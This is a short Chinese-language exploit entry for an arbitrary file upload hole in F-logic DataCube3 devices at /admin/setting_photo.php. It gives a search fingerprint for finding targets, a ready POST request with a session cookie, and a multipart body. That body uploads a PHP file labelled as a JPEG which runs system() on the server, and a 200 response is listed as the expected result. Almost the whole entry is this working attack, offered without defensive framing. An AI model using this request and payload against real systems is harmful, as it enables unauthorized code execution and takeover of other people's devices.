# F-logicDataCube3setting_photo.php任意文件上传漏洞

- **系统**：F-logicDataCube3setting_photo.php　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`title=="DataCube3"`
- **请求**：`POST /admin/setting_photo.php HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data;boundary=---------------------------1133…`　`Cookie: SESS_IDS=lbmi47rd8442eiu2kg6gg3e17p`

**请求体 / payload**
```
-----------------------------113389720123090127612523184396
Content-Disposition: form-data; name="add"
.............................
-----------------------------113389720123090127612523184396
Content-Disposition: form-data; name="addPhoto"; filename="dudesite.php"
Content-Type: image/jpeg
<?php system("echo dudesite");?>
-----------------------------113389720123090127612523184396
Content-Disposition: form-data; name="accesstime"
0.85628800 1710984011
-----------------------------113389720123090127612523184396--
```
- **预期**：200　|　—